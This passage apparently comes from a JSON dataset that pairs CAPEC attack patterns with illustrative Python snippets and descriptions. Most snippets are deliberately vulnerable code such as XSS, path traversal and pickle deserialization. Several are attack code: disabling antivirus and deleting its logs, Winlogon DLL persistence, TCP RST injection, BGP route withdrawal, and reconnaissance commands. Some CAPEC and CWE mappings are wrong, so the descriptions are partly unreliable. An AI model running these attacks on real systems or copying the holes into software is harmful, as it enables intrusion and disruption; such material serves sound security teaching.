        "code_snippet": "import os\n\n# Function to get the list of running services\n# This function exposes sensitive system information to unauthorized users\n# CWE-200, CWE-497\n\ndef get_running_services():\n    try:\n        # Using 'tasklist' command to get the list of services\n        services = os.popen('tasklist /svc').read()\n        return services\n    except Exception as e:\n        return str(e)\n\n# Function to display services information\n# This can be accessed by unauthorized users, leading to information exposure\n# CWE-214\n\ndef display_services_info():\n    services_info = get_running_services()\n    print(services_info)\n\n# Main function to invoke the display of services\nif __name__ == '__main__':\n    display_services_info()",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Services Footprinting' (CAPEC-309). The `get_running_services` function uses the `tasklist /svc` command to retrieve a list of running services on the system. This information is then displayed by the `display_services_info` function. The code exposes sensitive system information (CWE-200, CWE-497) to unauthorized users, as it does not implement any access control mechanisms. Additionally, the invocation of the process with visible sensitive information (CWE-214) can be exploited by attackers to gain insights into the target environment, potentially leading to further malicious activities."
    },
    {
        "capec_id": "575",
        "capec_name": "Account Footprinting",
        "code_snippet": "import os\n\n# Function to get user information\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\ndef get_user_info():\n    try:\n        # CWE-214: Invocation of Process Using Visible Sensitive Information\n        user_info = os.popen('net user').read()\n        return user_info\n    except Exception as e:\n        return str(e)\n\n# Function to get domain information\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\ndef get_domain_info():\n    try:\n        # CWE-214: Invocation of Process Using Visible Sensitive Information\n        domain_info = os.popen('dsquery user').read()\n        return domain_info\n    except Exception as e:\n        return str(e)\n\n# Example usage\nif __name__ == '__main__':\n    print('User Information:')\n    print(get_user_info())\n    print('Domain Information:')\n    print(get_domain_info())",
        "description": "This Python code snippet demonstrates how an adversary might exploit system commands to gather sensitive information about user accounts and domain information on a Windows system. The `get_user_info` function uses the 'net user' command to retrieve user account details, while the `get_domain_info` function uses the 'dsquery user' command to gather domain user information. Both functions expose sensitive information to unauthorized actors (CWE-200, CWE-497) and invoke processes with visible sensitive information (CWE-214). This code embodies the main idea of CAPEC-170 (Account Footprinting) by showing how an adversary can exploit system commands to gather information that can be used for further malicious activities."
    },
    {
        "capec_id": "576",
        "capec_name": "Group Permission Footprinting",
        "code_snippet": "import os\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-214: Invocation of Process Using Visible Sensitive Information\n# CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\n# CWE-842: Placement of User into Incorrect Group\n# CWE-1229: Creation of Emergent Resource\n\ndef list_local_groups():\n    # This command exposes sensitive information about user groups\n    command = 'net localgroup'\n    result = os.popen(command).read()\n    return result\n\n# Simulate an unauthorized user calling the function\nif __name__ == '__main__':\n    groups_info = list_local_groups()\n    print(groups_info)",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Group Permission Footprinting' (CAPEC). The function `list_local_groups` uses the `os.popen` method to execute the 'net localgroup' command, which lists all local groups on a Windows system. This information can be sensitive and should not be exposed to unauthorized users. The code also highlights several related CWEs: \n- CWE-200: The function exposes sensitive information about user groups.\n- CWE-214: The command is invoked in a way that could expose sensitive information to other processes.\n- CWE-529: The information about access control lists is exposed to unauthorized users.\n- CWE-842: The code does not check if the user is authorized to access this information, potentially placing them in an incorrect group.\n- CWE-1229: The function indirectly creates a resource (the list of groups) that can be exploited by attackers."
    },
    {
        "capec_id": "577",
        "capec_name": "Owner Footprinting",
        "code_snippet": "import os\nimport time\n\n# Function to get the last modified time of a file\n# This simulates the 'dir /A ntuser.dat' command on Windows\n# and exposes sensitive information about user activity\n\ndef get_last_modified_time(file_path):\n    try:\n        # Check if the file exists\n        if os.path.exists(file_path):\n            # Get the last modified time\n            last_modified_time = os.path.getmtime(file_path)\n            # Convert to human-readable format\n            readable_time = time.ctime(last_modified_time)\n            return readable_time\n        else:\n            return \"File does not exist\"\n    except Exception as e:\n        return str(e)\n\n# Example usage\nfile_path = '/home/user/.bash_history'  # Path to a sensitive file\nprint(f\"Last modified time of {file_path}: {get_last_modified_time(file_path)}\")",
        "description": "This Python code snippet demonstrates how to retrieve and display the last modified time of a file, which can be used to infer user activity on a system. The function 'get_last_modified_time' checks if the specified file exists and then retrieves its last modified time, converting it to a human-readable format. This simulates the 'dir /A ntuser.dat' command on Windows, which is used to identify the last login time of a user by checking the modification time of the 'ntuser.dat' file. The example usage targets a sensitive file ('.bash_history') to illustrate how an adversary might exploit this information. This code embodies the main idea of CAPEC-200: Owner Footprinting, and highlights related CWEs such as exposure of sensitive information (CWE-200) and exposure of system-level information (CWE-497)."
    },
    {
        "capec_id": "578",
        "capec_name": "Disable Security Software",
        "code_snippet": "import os\nimport subprocess\n\n# CWE-798: Use of Hard-coded Credentials\nadmin_password = 'hardcoded_password'\n\n# Function to disable security software\n# CWE-284: Improper Access Control\n# CWE-671: Lack of Administrator Control over Security\n# CWE-1037 & CWE-733: Processor/Compiler Optimization Removal or Modification of Security-critical Code\n\ndef disable_security_software(password):\n    if password == admin_password:\n        try:\n            # Attempt to kill a security process (e.g., antivirus)\n            subprocess.run(['taskkill', '/F', '/IM', 'antivirus.exe'], check=True)\n            # Delete a registry key to prevent security software from starting\n            os.system('reg delete HKLM\\Software\\SecuritySoftware /f')\n            # Delete log files\n            os.remove('C:\\SecuritySoftware\\logs\\logfile.log')\n            print('Security software disabled.')\n        except Exception as e:\n            print(f'Error disabling security software: {e}')\n    else:\n        print('Invalid password.')\n\n# Example usage\n# This would be called by an unauthorized actor who knows the hard-coded password\ndisable_security_software('hardcoded_password')",
        "description": "This Python code snippet demonstrates a scenario where an adversary can disable security software by exploiting several weaknesses. The code uses a hard-coded password (CWE-798) to authenticate an unauthorized user. If the password matches, it proceeds to disable security software by killing a process, deleting a registry key, and removing log files (CWE-284, CWE-671). The code also implicitly represents potential issues with processor or compiler optimizations that could remove or modify security-critical code (CWE-1037, CWE-733). This snippet embodies the main idea of the CAPEC 'Disable Security Software' by showing how an adversary can exploit these weaknesses to disable security mechanisms."
    },
    {
        "capec_id": "579",
        "capec_name": "Replace Winlogon Helper DLL",
        "code_snippet": "import winreg\n\n# Vulnerable code: Modifying Winlogon registry key to load a malicious DLL\ntry:\n    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon', 0, winreg.KEY_SET_VALUE)\n    winreg.SetValueEx(key, 'Userinit', 0, winreg.REG_SZ, 'C:\\malicious.dll')\n    winreg.CloseKey(key)\n    print('Registry key modified successfully.')\nexcept Exception as e:\n    print(f'Failed to modify registry key: {e}')",
        "description": "This Python code snippet demonstrates a vulnerability where the Winlogon registry key is modified to load a malicious DLL at startup. The code opens the Winlogon registry key and sets the 'Userinit' value to a path of a malicious DLL. This represents the CAPEC 'Replace Winlogon Helper DLL' by showing how an adversary can exploit this feature to load adversarial code at startup. The related CWEs provide additional context: CWE-15 (External Control of System or Configuration Setting) is demonstrated by allowing external modification of the registry key, and CWE-427 (Uncontrolled Search Path Element) is relevant as the DLL path can be controlled by an attacker."
    },
    {
        "capec_id": "580",
        "capec_name": "System Footprinting",
        "code_snippet": "import os\nimport time\n\n# Function to simulate a login process\ndef login(username, password):\n    # Simulate checking credentials\n    if username == 'admin' and password == 'password123':\n        return 'Login successful'\n    else:\n        return 'Login failed'\n\n# Function to simulate system footprinting\ndef footprint_system():\n    # Simulate probing for system information\n    response = os.popen('uname -a').read()\n    return response\n\n# Function to simulate timing discrepancy\ndef check_user(username):\n    start_time = time.time()\n    if username == 'admin':\n        time.sleep(1)  # Simulate longer processing time for admin user\n    end_time = time.time()\n    return end_time - start_time\n\n# Example usage\nprint(login('admin', 'password123'))  # Observable response discrepancy\nprint(footprint_system())  # Exposure of sensitive system information\nprint(check_user('admin'))  # Observable timing discrepancy\nprint(check_user('user'))",
        "description": "This Python code snippet demonstrates several vulnerabilities related to system footprinting and observable discrepancies. The `login` function simulates a login process that can reveal internal state information through different responses (CWE-204). The `footprint_system` function simulates probing for system information, exposing sensitive system-level information (CWE-497). The `check_user` function introduces a timing discrepancy based on the username, revealing security-relevant information through different processing times (CWE-208). These functions collectively illustrate how an adversary might engage in active probing and exploration activities to gather security information about a remote target system."
    },
    {
        "capec_id": "581",
        "capec_name": "Security Software Footprinting",
        "code_snippet": "import os\nimport subprocess\n\n# Function to list installed security software\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-1395: Dependency on Vulnerable Third-Party Component\n# CWE-512: Spyware\n# CWE-507: Trojan Horse\n\ndef list_security_software():\n    try:\n        # Attempt to list installed security software\n        # This command may vary based on the operating system\n        installed_software = subprocess.check_output(['wmic', 'product', 'get', 'name'], shell=True)\n        installed_software = installed_software.decode('utf-8')\n        \n        # Filter for known security software\n        security_software = [line for line in installed_software.split('\\n') if 'antivirus' in line.lower() or 'firewall' in line.lower()]\n        \n        # Print the list of security software\n        for software in security_software:\n            print(f'Security Software Found: {software}')\n    except Exception as e:\n        print(f'Error: {e}')\n\n# Call the function to list security software\nlist_security_software()",
        "description": "This Python code snippet attempts to list installed security software on a system by using the 'wmic' command to get a list of installed products. It then filters this list for known security software such as antivirus or firewall programs. This embodies the main idea of CAPEC-170 (Security Software Footprinting) by attempting to identify security tools installed on the system. The code also touches on several related CWEs: CWE-497 by potentially exposing sensitive system information, CWE-1395 by relying on the 'wmic' command which could be vulnerable, CWE-512 by collecting information about the user's system without explicit approval, and CWE-507 by potentially being used as part of a Trojan Horse to gather information surreptitiously."
    },
    {
        "capec_id": "582",
        "capec_name": "Route Disabling",
        "code_snippet": "import socket\nimport threading\n\n# Simulate a network route disabling attack\nclass RouteDisabler:\n    def __init__(self, target_ip, target_port):\n        self.target_ip = target_ip\n        self.target_port = target_port\n        self.running = False\n\n    def start_attack(self):\n        self.running = True\n        threading.Thread(target=self._disable_route).start()\n\n    def stop_attack(self):\n        self.running = False\n\n    def _disable_route(self):\n        while self.running:\n            try:\n                # Create a socket to simulate route disabling\n                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                s.connect((self.target_ip, self.target_port))\n                s.shutdown(socket.SHUT_RDWR)\n                s.close()\n            except Exception as e:\n                print(f\"Error: {e}\")\n\n# Example usage\nif __name__ == '__main__':\n    disabler = RouteDisabler('192.168.1.1', 80)\n    disabler.start_attack()\n    # Let the attack run for 10 seconds\n    threading.Timer(10, disabler.stop_attack).start()",
        "description": "This Python code snippet simulates a network route disabling attack, embodying the main idea of CAPEC-Route Disabling. The `RouteDisabler` class targets a specific IP and port, repeatedly attempting to connect and then immediately shutting down the connection, effectively disrupting the communication channel. This simulates the severing of the route between two entities. The code also demonstrates related CWEs, such as improper restriction of communication channels (CWE-923) and race conditions during access to alternate channels (CWE-421), by not ensuring the integrity and proper endpoint communication."
    },
    {
        "capec_id": "583",
        "capec_name": "Disabling Network Hardware",
        "code_snippet": "import os\nimport time\n\n# CWE-1256: Improper Restriction of Software Interfaces to Hardware Features\n# This function improperly allows software to control hardware power state\n\ndef disable_network_hardware():\n    try:\n        # CWE-1304: Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation\n        # Simulate power down of network hardware\n        os.system('echo 0 > /sys/class/net/eth0/device/power')\n        time.sleep(5)  # Simulate downtime\n        # Simulate power restore of network hardware\n        os.system('echo 1 > /sys/class/net/eth0/device/power')\n    except Exception as e:\n        # CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\n        # Error handling is not properly secured\n        print(f\"Error: {e}\")\n\n# CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n# This function can be called by an unauthorized user to disrupt network hardware\nif __name__ == '__main__':\n    disable_network_hardware()",
        "description": "This Python code snippet demonstrates a scenario where network hardware can be disabled and re-enabled through software commands, embodying the main idea of the CAPEC 'Disabling Network Hardware'. The function `disable_network_hardware` simulates powering down and restoring network hardware, which can be exploited by an unauthorized user to disrupt network services. The code also highlights several related CWEs: improper restriction of software interfaces to hardware features (CWE-1256), improper preservation of hardware configuration state during power operations (CWE-1304), and improper protection for error messages (CWE-1320). This example shows how an attacker could exploit these weaknesses to disable critical network hardware, causing service disruption."
    },
    {
        "capec_id": "584",
        "capec_name": "BGP Route Disabling",
        "code_snippet": "import socket\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')\n\ndef bgp_route_disabling(target_ip, malicious_ip):\n    # Create a socket for BGP communication\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((target_ip, 179))  # BGP typically uses port 179\n\n    # Construct a BGP update message with a malicious route\n    bgp_update_message = f\"UPDATE: Withdraw route to {target_ip} via {malicious_ip}\"\n\n    # CWE-924: No integrity check on the message\n    s.send(bgp_update_message.encode('utf-8'))\n\n    # CWE-757: Using a less secure algorithm for message transmission\n    # (In this case, plain text without encryption)\n    print(f\"Sent malicious BGP update to {target_ip} to withdraw route via {malicious_ip}\")\n\n    s.close()\n\n# Example usage\nbgp_route_disabling('192.0.2.1', '198.51.100.1')",
        "description": "This Python code snippet demonstrates a simplified version of a BGP route disabling attack. The function `bgp_route_disabling` takes a target IP and a malicious IP as arguments. It creates a socket connection to the target IP on port 179, which is typically used for BGP communication. The function then constructs a BGP update message to withdraw the route to the target IP via the malicious IP and sends this message without any integrity checks or encryption, embodying CWE-924 and CWE-757. This action can disrupt the network routing, making the target network inaccessible, which is the main idea of the CAPEC 'BGP Route Disabling'."
    },
    {
        "capec_id": "585",
        "capec_name": "DNS Domain Seizure",
        "code_snippet": "import socket\nimport requests\n\n# CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\ndef is_trusted_domain(ip_address):\n    try:\n        hostname = socket.gethostbyaddr(ip_address)[0]\n        # CWE-942: Permissive Cross-domain Policy with Untrusted Domains\n        trusted_domains = ['trusted.com', 'secure.org']\n        return any(hostname.endswith(domain) for domain in trusted_domains)\n    except socket.herror:\n        return False\n\n# CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\ndef redirect_user(user_input_url):\n    if is_trusted_domain(user_input_url):\n        return requests.get(user_input_url).url\n    else:\n        return 'http://trusted.com/default'\n\n# CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\ndef generate_web_page(user_input):\n    return f'<html><body>{user_input}</body></html>'\n\n# Example usage\nuser_ip = '192.168.1.1'\nuser_url = 'http://malicious.com'\nuser_input = '<script>alert(\"XSS\")</script>'\n\nif is_trusted_domain(user_ip):\n    print('Domain is trusted')\nelse:\n    print('Domain is not trusted')\n\nredirected_url = redirect_user(user_url)\nprint(f'Redirected URL: {redirected_url}')\n\nweb_page = generate_web_page(user_input)\nprint(f'Generated Web Page: {web_page}')",
        "description": "This Python code snippet demonstrates a simplified scenario of DNS Domain Seizure and related vulnerabilities. The `is_trusted_domain` function checks if an IP address resolves to a trusted domain, highlighting CWE-350. The `redirect_user` function redirects users based on their input URL, showing CWE-601. The `generate_web_page` function creates a web page with user input, illustrating CWE-79. The code represents the main idea of DNS Domain Seizure by showing how reliance on DNS resolution and improper handling of user inputs can lead to security issues."
    },
    {
        "capec_id": "586",
        "capec_name": "Object Injection",
        "code_snippet": "import pickle\nimport os\n\nclass SensitiveData:\n    def __init__(self, secret):\n        self.secret = secret\n\nclass MaliciousPayload:\n    def __reduce__(self):\n        return (os.system, ('echo Malicious Code Executed',))\n\n# Simulate deserialization of untrusted data\nserialized_data = pickle.dumps(MaliciousPayload())\n\n# Vulnerable deserialization\ntry:\n    deserialized_object = pickle.loads(serialized_data)\nexcept Exception as e:\n    print(f'Error during deserialization: {e}')\n",
        "description": "This Python code snippet demonstrates a vulnerability related to object injection and deserialization of untrusted data (CWE-502). The `SensitiveData` class represents a class that could contain sensitive information (CWE-499). The `MaliciousPayload` class is designed to exploit the deserialization process by overriding the `__reduce__` method to execute a system command (CWE-77). The `pickle` module is used to serialize and deserialize objects. The code simulates the deserialization of a malicious payload, which results in the execution of a system command, illustrating the potential for remote code execution. This example highlights the risks associated with deserializing untrusted data without proper validation."
    },
    {
        "capec_id": "587",
        "capec_name": "Cross Frame Scripting (XFS)",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return '''<html>\n<head>\n    <title>Vulnerable Page</title>\n</head>\n<body>\n    <h1>Welcome to the Vulnerable Page</h1>\n    <iframe src=\"https://trusted-site.com\" style=\"display:none;\" id=\"trustedFrame\"></iframe>\n    <script>\n        // Malicious JavaScript interacting with the hidden iframe\n        var iframe = document.getElementById('trustedFrame');\n        iframe.onload = function() {\n            var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;\n            var sensitiveData = iframeDoc.getElementById('sensitiveData').innerText;\n            alert('Sensitive Data: ' + sensitiveData);\n        };\n    </script>\n</body>\n</html>'''\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet creates a simple Flask web application that serves a vulnerable HTML page. The page includes a hidden iframe that loads content from a trusted site. Malicious JavaScript is used to interact with the hidden iframe and extract sensitive data from it. This demonstrates the concept of Cross Frame Scripting (XFS), where an attacker uses a combination of social engineering and malicious JavaScript to interact with a legitimate webpage loaded in a concealed iframe. The code also touches on related CWEs, such as improper restriction of rendered UI layers or frames (CWE-1021) and improper neutralization of input (CWE-79)."
    },
    {
        "capec_id": "588",
        "capec_name": "DOM-Based XSS",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    user_input = request.args.get('input', '')\n    # Vulnerable to DOM-Based XSS\n    template = '''<html>\n<head><title>DOM XSS Example</title></head>\n<body>\n    <h1>Welcome!</h1>\n    <div id=\"content\"></div>\n    <script>\n        var userInput = \"{{ user_input }}\";\n        document.getElementById('content').innerHTML = userInput;\n    </script>\n</body>\n</html>'''\n    return render_template_string(template, user_input=user_input)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to DOM-Based XSS attacks. The application takes user input from a query parameter and directly inserts it into the DOM using JavaScript without proper validation or encoding. This allows an attacker to inject malicious scripts that will be executed in the context of the user's browser. The code highlights the CWE-79 (Improper Neutralization of Input During Web Page Generation), CWE-20 (Improper Input Validation), and CWE-83 (Improper Neutralization of Script in Attributes in a Web Page) weaknesses by not sanitizing the user input before embedding it into the HTML content."
    },
    {
        "capec_id": "589",
        "capec_name": "DNS Blocking",
        "code_snippet": "import socket\n\n# Vulnerable DNS request handling\nclass DNSBlocker:\n    def __init__(self, block_list):\n        self.block_list = block_list\n\n    def resolve_hostname(self, hostname):\n        try:\n            ip_address = socket.gethostbyname(hostname)\n            if ip_address in self.block_list:\n                print(f\"Access to {hostname} is blocked.\")\n                return None\n            return ip_address\n        except socket.error:\n            print(f\"Failed to resolve {hostname}.\")\n            return None\n\n# Example usage\nblock_list = ['192.168.1.1', '10.0.0.1']\ndns_blocker = DNSBlocker(block_list)\n\n# Attempt to resolve a hostname\nhostname = 'example.com'\nip = dns_blocker.resolve_hostname(hostname)\nif ip:\n    print(f\"IP address of {hostname} is {ip}\")",
        "description": "This Python code snippet demonstrates a simplified version of DNS blocking, where an adversary intercepts DNS requests and blocks access to specific IP addresses. The `DNSBlocker` class takes a list of IP addresses to block. The `resolve_hostname` method attempts to resolve a given hostname to its IP address and checks if the resolved IP address is in the block list. If it is, access is denied. This embodies the CAPEC concept of DNS Blocking and incorporates CWE-291 (Reliance on IP Address for Authentication) by using IP addresses to make security decisions, and CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action) by resolving hostnames to IP addresses for blocking purposes."
    },
    {
        "capec_id": "590",
        "capec_name": "IP Address Blocking",
        "code_snippet": "import socket\n\n# Vulnerable server binding to an unrestricted IP address\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('0.0.0.0', 8080))\nserver_socket.listen(5)\n\nprint('Server listening on 0.0.0.0:8080')\n\nwhile True:\n    client_socket, client_address = server_socket.accept()\n    print(f'Connection from {client_address}')\n    # Reliance on IP address for authentication\n    if client_address[0] == '192.168.1.100':\n        client_socket.send(b'Authenticated')\n    else:\n        client_socket.send(b'Access Denied')\n    client_socket.close()",
        "description": "This Python code snippet demonstrates a vulnerable server that binds to an unrestricted IP address (0.0.0.0), making it accessible from any network interface. The server listens for incoming connections on port 8080. When a client connects, the server relies on the client's IP address for authentication, granting access if the IP address matches '192.168.1.100'. This approach is insecure because it can be easily spoofed, and the server does not adequately verify the identity of the client. This code embodies the main idea of the CAPEC 'IP Address Blocking' by showing how improper handling of IP addresses and communication channels can lead to vulnerabilities, as described in the related CWEs."
    },
    {
        "capec_id": "591",
        "capec_name": "Reflected XSS",
        "code_snippet": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/search')\ndef search():\n    query = request.args.get('q')\n    # Vulnerable to Reflected XSS\n    return f'<html><body>Search results for: {query}</body></html>'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application with a search endpoint. The endpoint takes a query parameter 'q' from the URL and directly includes it in the HTML response without any sanitization or neutralization. This makes the application vulnerable to Reflected Cross-Site Scripting (XSS) attacks (CWE-79). An attacker could craft a URL with a malicious script in the 'q' parameter, which would then be reflected back to the victim's browser and executed. This example also touches on CWE-82, CWE-692, CWE-84, and CWE-81 by demonstrating improper neutralization of user input in a web page context."
    },
    {
        "capec_id": "592",
        "capec_name": "Stored XSS",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n# Simulated database\ncomments = []\n\n@app.route('/submit', methods=['POST'])\ndef submit_comment():\n    comment = request.form['comment']\n    # Vulnerable to Stored XSS\n    comments.append(comment)\n    return 'Comment submitted!'\n\n@app.route('/view')\ndef view_comments():\n    # Vulnerable to Stored XSS\n    comments_html = ''.join(f'<p>{comment}</p>' for comment in comments)\n    return render_template_string(f'<html><body>{comments_html}</body></html>')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application that is vulnerable to Stored Cross-Site Scripting (XSS). The application has two routes: '/submit' for submitting comments and '/view' for viewing them. The comments are stored in a list and directly rendered in the HTML without any sanitization, making it susceptible to XSS attacks. An attacker can submit a malicious script as a comment, which will be stored and executed when the '/view' page is accessed. This example embodies the main idea of CAPEC-63 (Stored XSS) and highlights related CWEs such as CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-692 (Incomplete Denylist to Cross-Site Scripting)."
    },
    {
        "capec_id": "593",
        "capec_name": "Session Hijacking",
        "code_snippet": "from flask import Flask, session, redirect, url_for, request\n\napp = Flask(__name__)\napp.secret_key = 'supersecretkey'\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    if authenticate(username, password):\n        session['user_id'] = username  # CWE-287: Improper Authentication\n        return redirect(url_for('dashboard'))\n    return 'Invalid credentials', 401\n\n@app.route('/dashboard')\ndef dashboard():\n    if 'user_id' in session:\n        return f'Welcome {session['user_id']}'\n    return redirect(url_for('login'))\n\n@app.route('/logout')\ndef logout():\n    session.pop('user_id', None)\n    return redirect(url_for('login'))\n\ndef authenticate(username, password):\n    # Dummy authentication function\n    return username == 'admin' and password == 'password'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application with a login mechanism that is vulnerable to session hijacking. The code includes a login route that sets a session variable 'user_id' upon successful authentication. However, it does not invalidate any existing session identifier (CWE-384: Session Fixation) and relies on client-side session management (CWE-602: Client-Side Enforcement of Server-Side Security). Additionally, the session does not have an expiration mechanism (CWE-613: Insufficient Session Expiration), and the authentication process is overly simplistic and insecure (CWE-287: Improper Authentication). This setup can allow an attacker to hijack or manipulate sessions, gaining unauthorized access to the application."
    },
    {
        "capec_id": "594",
        "capec_name": "Traffic Injection",
        "code_snippet": "import socket\n\n# Vulnerable server code\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('0.0.0.0', 12345))\nserver_socket.listen(5)\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr}')\n    data = client_socket.recv(1024)\n    if data:\n        print(f'Received: {data.decode()}')\n        # Echo the received data back to the client\n        client_socket.send(data)\n    client_socket.close()",
        "description": "This Python code snippet represents a simple TCP server that is vulnerable to traffic injection attacks. The server accepts incoming connections and echoes back any received data. The vulnerabilities include:\n\n1. **Improper Verification of Source of a Communication Channel (CWE-940)**: The server does not verify the source of the incoming connection, allowing any actor to connect and send data.\n2. **Cleartext Transmission of Sensitive Information (CWE-319)**: Data is transmitted in cleartext, making it susceptible to sniffing by unauthorized actors.\n3. **Improper Enforcement of Message Integrity During Transmission (CWE-924)**: The server does not ensure the integrity of the received data, allowing potential modification during transmission.\n\nThis code embodies the main idea of the CAPEC by demonstrating how an adversary can inject traffic into the network connection, potentially disrupting or modifying the communication."
    },
    {
        "capec_id": "595",
        "capec_name": "Connection Reset",
        "code_snippet": "import socket\nimport struct\n\n# Function to create a TCP reset packet\ndef create_reset_packet(src_ip, src_port, dst_ip, dst_port, seq_num):\n    ip_header = struct.pack('!BBHHHBBH4s4s',\n                            69, 0, 40, 54321, 0, 64, socket.IPPROTO_TCP, 0,\n                            socket.inet_aton(src_ip), socket.inet_aton(dst_ip))\n    tcp_header = struct.pack('!HHLLBBHHH',\n                             src_port, dst_port, seq_num, 0, 5 << 4, 4, 8192, 0, 0)\n    return ip_header + tcp_header\n\n# Function to send the reset packet\ndef send_reset_packet(packet, dst_ip):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)\n    sock.sendto(packet, (dst_ip, 0))\n\n# Example usage\nsrc_ip = '192.168.1.2'\nsrc_port = 12345\ndst_ip = '192.168.1.3'\ndst_port = 80\nseq_num = 1000\n\nreset_packet = create_reset_packet(src_ip, src_port, dst_ip, dst_port, seq_num)\nsend_reset_packet(reset_packet, dst_ip)",
        "description": "This Python code snippet demonstrates how an attacker might inject a TCP reset packet to disrupt an active connection between two endpoints. The `create_reset_packet` function constructs a TCP reset packet with the given source and destination IP addresses and ports, as well as a sequence number. The `send_reset_packet` function sends this packet to the destination IP using a raw socket. This embodies the CAPEC 'Connection Reset' attack pattern by showing how an attacker can sever a connection without directly filtering the traffic. The code also touches on related CWEs, such as improper verification of the source of a communication channel (CWE-940) and improper enforcement of message integrity (CWE-924), by demonstrating how an attacker can spoof a reset packet to disrupt communication."
    },
    {
        "capec_id": "596",
        "capec_name": "TCP RST Injection",
        "code_snippet": "import socket\nimport struct\n\n# Function to create a TCP RST packet\ndef create_rst_packet(src_ip, src_port, dst_ip, dst_port, seq_num):\n    ip_header = struct.pack('!BBHHHBBH4s4s',\n                            69, 0, 40, 54321, 0, 64, socket.IPPROTO_TCP, 0,\n                            socket.inet_aton(src_ip), socket.inet_aton(dst_ip))\n    tcp_header = struct.pack('!HHLLBBHHH',\n                             src_port, dst_port, seq_num, 0, 80, 4, 8192, 0, 0)\n    return ip_header + tcp_header\n\n# Function to send the TCP RST packet\ndef send_rst_packet(src_ip, src_port, dst_ip, dst_port, seq_num):\n    packet = create_rst_packet(src_ip, src_port, dst_ip, dst_port, seq_num)\n    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW) as s:\n        s.sendto(packet, (dst_ip, 0))\n\n# Example usage\nsrc_ip = '192.168.1.2'\nsrc_port = 12345\ndst_ip = '192.168.1.1'\ndst_port = 80\nseq_num = 1000\n\nsend_rst_packet(src_ip, src_port, dst_ip, dst_port, seq_num)",
        "description": "This Python code snippet demonstrates how an adversary might perform a TCP RST Injection attack. The code creates and sends a TCP RST packet to terminate an active TCP connection. The `create_rst_packet` function constructs the IP and TCP headers for the RST packet, and the `send_rst_packet` function sends the packet using a raw socket. The example usage at the end shows how to use these functions to send a TCP RST packet from a source IP and port to a destination IP and port with a specified sequence number. This attack can disrupt communication by forcing the termination of a TCP connection, exploiting the lack of proper verification of the source of a communication channel (CWE-940)."
    },
    {
        "capec_id": "597",
        "capec_name": "Absolute Path Traversal",
        "code_snippet": "import os\n\n# Function to read a file from a given path\n# This function is vulnerable to absolute path traversal\n\ndef read_file(file_path):\n    try:\n        with open(file_path, 'r') as file:\n            return file.read()\n    except FileNotFoundError:\n        return 'File not found'\n    except Exception as e:\n        return str(e)\n\n# Example usage\nuser_input = '/etc/passwd'  # This input can be controlled by an attacker\nprint(read_file(user_input))",
        "description": "This Python code snippet demonstrates a vulnerability to absolute path traversal. The `read_file` function takes a file path as input and attempts to read the file's contents. However, it does not validate or sanitize the input path, allowing an attacker to provide an absolute path (e.g., '/etc/passwd') to access sensitive files outside the intended directory. This embodies the main idea of the CAPEC and related CWEs, where improper handling of file paths can lead to unauthorized access to restricted areas of the file system."
    },
    {
        "capec_id": "598",
        "capec_name": "DNS Spoofing",
